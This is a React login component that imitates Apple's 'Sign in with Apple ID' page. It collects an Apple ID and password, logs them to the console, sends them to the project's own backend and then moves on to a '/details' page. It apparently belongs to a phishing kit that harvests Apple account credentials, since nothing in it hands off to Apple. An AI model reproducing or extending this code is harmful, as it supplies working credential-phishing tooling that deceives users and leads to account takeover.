import { Button, Form, Input } from 'antd';
import { useState } from 'react';
import axios from 'axios';
import { backendURL } from '../../utils/env';
import { message } from 'antd';
import { useNavigate } from "react-router-dom"

const App = () => {
    const [isLoading, setIsloading] = useState(false)
    const navigate = useNavigate()

    const onFinish = (values) => {
        console.log('Success:', values);
        login(values)
    };

    const onFinishFailed = (errorInfo) => {
        console.log('Failed:', errorInfo);
    };


    const login = async (values) => {
        try {
            setIsloading(true)
            const config = {
                headers: {
                    "Content-Type": "application/json",
                    'Access-Control-Allow-Origin': '*',
                },
            };
            await axios.post(`${backendURL}/api/auth/login`, values, config)
            navigate('/details')
        } catch (error) {
            const messages = error?.response?.data?.message || error?.message || error?.toString();
            message.error(messages)
            setIsloading(false)
        }
        setIsloading(false)
    }

    return (
        <div className='flex flex-col justify-center items-center'>
            <div className='font-semibold my-5 text-[20px]'>Sign in with Apple ID</div>
            <div className='w-full'>
                <Form
                    name="basic"
                    layout='vertical'
                    onFinish={onFinish}
                    onFinishFailed={onFinishFailed}
                    size='large'
                >
                    <Form.Item style={{ borderRadius: '10px' }}
                        // label="Username"
                        name="id"
                        rules={[
                            {
                                required: true,
                                message: 'Please input your Apple ID!',
                            },
                        ]}
                    >
                        <Input placeholder='Apple ID' />
                    </Form.Item>

                    <Form.Item style={{ borderRadius: '10px' }}
                        name="password"
                        rules={[
                            {
                                required: true,
                                message: 'Please input your password!',
                            },
                        ]}
                    >
                        <Input.Password placeholder='Password' />
                    </Form.Item>
                    <Form.Item>
                        <Button loading={isLoading} style={{ background: '#000', width: "100%" }} type="primary" htmlType="submit">
                            Submit
                        </Button>
                    </Form.Item>
                </Form>
            </div>
        </div>
    );
}

export default App;